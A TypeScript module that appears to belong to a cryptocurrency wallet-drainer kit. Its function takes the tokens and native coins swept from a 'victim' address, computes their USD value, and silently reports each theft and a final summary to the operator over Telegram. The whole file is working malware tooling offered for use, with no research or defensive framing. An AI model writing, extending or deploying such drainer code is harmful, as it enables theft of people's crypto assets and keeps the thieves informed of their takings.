import * as tg from "@/lib/telegram";
import { ethers } from "ethers";

/** 📊 FORMATTER: Ensures currency is consistent across all reports */
export const formatMoney = (val: any) => {
  return new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
  }).format(Number(val || 0));
};

interface ReportParams {
  assets: any[];
  txHash: string;
  chainId: number;
  victimAddress: string;
  receiver: string;
  suffix: string;
  strikeType: string;
  nativeSym: string;
  sweepValue: bigint;
}

/** 🚀 UNIFIED TELEMETRY ENGINE */
export async function sendFinalReports({
  assets,
  txHash,
  chainId,
  victimAddress,
  receiver,
  suffix,
  strikeType,
  nativeSym,
  sweepValue,
}: ReportParams) {
  let totalUSD = 0;
  let actualAssetCount = 0;
  const telemetryPromises = [];

  // 1️⃣ Process ERC-20 / BEP-20 / Alt-Tokens
  for (const a of assets) {
    const addr = a.token || a.contractAddress;
    // Skip native address placeholders (handled below)
    if (!addr || addr === "0x0000000000000000000000000000000000000000")
      continue;

    const usdVal = Number(a.usdValue || a.v || 0);
    totalUSD += usdVal;
    actualAssetCount++;

    // 🛡️ TOKEN AMOUNT FIX: Safely attempt to format the token amount if data exists
    let tokenAmtDisplay = "";
    if (a.balance && a.decimals) {
      try {
        const parsed = parseFloat(
          ethers.formatUnits(a.balance.toString(), a.decimals),
        );
        // Show up to 4 decimal places for tokens to keep it clean
        tokenAmtDisplay = `${parsed.toFixed(4)} `;
      } catch (e) {}
    }

    // Combine Token Amount + USD Value (e.g., "150.0000 ($150.00)" or just "$150.00")
    const combinedTokenDisplay = tokenAmtDisplay
      ? `${tokenAmtDisplay} (${formatMoney(usdVal)})`
      : formatMoney(usdVal);

    telemetryPromises.push(
      tg.sendDetailedSweepToTelegram({
        status: "SUCCESS",
        hash: txHash,
        chainId: chainId.toString(),
        victimAddress: victimAddress,
        receiverAddress: receiver,
        amount: combinedTokenDisplay,
        symbol: `${a.symbol || "Token"} ${suffix}`,
        type: strikeType,
      }),
    );
  }

  // 2️⃣ Process Native Asset (ETH, BNB, etc.)
  if (sweepValue > 0n) {
    const nativeAsset = assets.find(
      (a: any) =>
        a.signatureType === "NATIVE" ||
        !a.token ||
        a.token === "0x0000000000000000000000000000000000000000",
    );

    const nativePrice = Number(nativeAsset?.price || 0);
    // 🛡️ NATIVE AMOUNT FIX: Convert BigInt to readable Ether format
    const nativeAmount = parseFloat(ethers.formatEther(sweepValue));
    const actualNativeUSD =
      nativePrice > 0
        ? nativeAmount * nativePrice
        : Number(nativeAsset?.usdValue || 0);

    totalUSD += actualNativeUSD;
    actualAssetCount++;

    // 🛡️ COMBINED DISPLAY: e.g., "0.500000 ($1,500.00)"
    const combinedNativeDisplay = `${nativeAmount.toFixed(6)} (${formatMoney(
      actualNativeUSD,
    )})`;

    telemetryPromises.push(
      tg.sendDetailedSweepToTelegram({
        status: "SUCCESS",
        hash: txHash,
        chainId: chainId.toString(),
        victimAddress: victimAddress,
        receiverAddress: receiver,
        amount: combinedNativeDisplay,
        symbol: `${nativeAsset?.symbol || nativeSym} ${suffix}`,
        type: strikeType,
      }),
    );
  }

  // 3️⃣ Send Final Summary
  telemetryPromises.push(
    tg.sendSweepSummaryToTelegram({
      victimAddress: victimAddress,
      totalAmount: formatMoney(totalUSD),
      assetCount: actualAssetCount,
      type: strikeType,
      suffix,
      hash: txHash,
    }),
  );

  // Execute all reporting silently to prevent blocking the main response
  return Promise.all(telemetryPromises).catch((err) =>
    console.error(`[DEBUG] Telemetry Error: ${err.message}`),
  );
}
